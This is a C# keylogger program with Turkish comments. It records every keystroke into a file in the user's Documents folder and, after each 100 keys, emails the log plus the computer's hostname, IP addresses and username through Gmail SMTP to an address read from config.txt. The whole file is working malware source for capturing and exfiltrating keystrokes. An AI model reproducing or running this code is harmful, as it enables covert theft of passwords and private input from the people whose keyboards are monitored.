using System.Runtime.InteropServices;
using System.Threading;
using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeyStrokes = 0;
        
        // Email ayarları - config.txt dosyasından okunacak
        static string emailAddress = "";
        static string emailPassword = "";

        static void Main(string[] args)
        {
            // Email ayarlarını yükle
            LoadEmailConfig();
            
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String path = Path.Combine(filePath, "keyloggerdata.txt");

            // Dosya yoksa oluştur
            if (!File.Exists(path))
            {
                File.WriteAllText(path, "", Encoding.UTF8);
            }

            Console.WriteLine("KeyLogger başlatıldı. Tuşlara basın (Çıkmak için Ctrl+C)...");
            Console.WriteLine($"Kayıt dosyası: {path}");

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 8; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if ((keyState & 0x8000) != 0)
                    {
                        string textToWrite = "";

                        if (i >= 32 && i <= 126)
                        {
                            Console.Write((char)i);
                            textToWrite = ((char)i).ToString();
                        }
                        else if (i == 13)  // Enter
                        {
                            Console.WriteLine();
                            textToWrite = Environment.NewLine;
                        }
                        else if (i == 8)  // Backspace
                        {
                            Console.Write("[BACKSPACE]");
                            textToWrite = "[BACKSPACE]";
                        }
                        else if (i == 32)  // Space
                        {
                            Console.Write(" ");
                            textToWrite = " ";
                        }
                        else
                        {
                            Console.Write($"[{i}]");
                            textToWrite = $"[{i}]";
                        }

                      
                        File.AppendAllText(path, textToWrite, Encoding.UTF8);
                        numberOfKeyStrokes++;
                        
                        
                        if (numberOfKeyStrokes >= 100)
                        {
                            SendNewMessage(path);
                            numberOfKeyStrokes = 0; 
                        }
                        
                        Thread.Sleep(100);

                    }
                }
            }
        }
        static void SendNewMessage(string path)
        {
            try
            {
                String logContent = File.ReadAllText(path, Encoding.UTF8);
                string emailBody = "";

                DateTime now = DateTime.Now;
                string subject = "Keylogger'dan Gelen Bilgiler - " + now.ToString("dd/MM/yyyy HH:mm");
                
                var host = Dns.GetHostEntry(Dns.GetHostName());
                emailBody += "=== SİSTEM BİLGİLERİ ===\n";
                emailBody += "Bilgisayar Adı: " + host.HostName + "\n";
                
                foreach (var address in host.AddressList)
                {
                    if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        emailBody += "IP Adresi: " + address.ToString() + "\n";
                    }
                }
                
                emailBody += "Kullanıcı Adı: " + Environment.UserName + "\n";
                emailBody += "Tarih: " + now.ToString("dd/MM/yyyy HH:mm:ss") + "\n\n";
                emailBody += "=== KAYDEDILEN TUŞLAR ===\n";
                emailBody += logContent;

                
                // Email ayarları kontrol et
                if (string.IsNullOrEmpty(emailAddress) || string.IsNullOrEmpty(emailPassword))
                {
                    Console.WriteLine("\n[Email ayarları yüklenmemiş! config.txt dosyasını kontrol edin.]");
                    return;
                }
                
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587); 
                client.EnableSsl = true;
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(emailAddress, emailPassword);
                
                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress(emailAddress);
                mailMessage.To.Add(emailAddress);
                mailMessage.Subject = subject;
                mailMessage.Body = emailBody;
                mailMessage.IsBodyHtml = false;
                
                client.Send(mailMessage);
                Console.WriteLine("\n[Email gönderildi!]");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[Email hatası: {ex.Message}]");
            }
        }
        
        static void LoadEmailConfig()
        {
            try
            {
                string configPath = "config.txt";
                
                if (!File.Exists(configPath))
                {
                    Console.WriteLine("config.txt bulunamadı. Oluşturuluyor...");
                    File.WriteAllText(configPath, "EMAIL=your-email@gmail.com\nPASSWORD=your-app-password-here", Encoding.UTF8);
                    Console.WriteLine("config.txt dosyasına email ve şifrenizi girin!");
                    return;
                }
                
                string[] lines = File.ReadAllLines(configPath, Encoding.UTF8);
                foreach (string line in lines)
                {
                    if (line.StartsWith("EMAIL="))
                    {
                        emailAddress = line.Substring(6).Trim();
                    }
                    else if (line.StartsWith("PASSWORD="))
                    {
                        emailPassword = line.Substring(9).Trim();
                    }
                }
                
                if (!string.IsNullOrEmpty(emailAddress) && !string.IsNullOrEmpty(emailPassword))
                {
                    Console.WriteLine($"Email ayarları yüklendi: {emailAddress}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Config yükleme hatası: {ex.Message}");
            }
        }
    }
}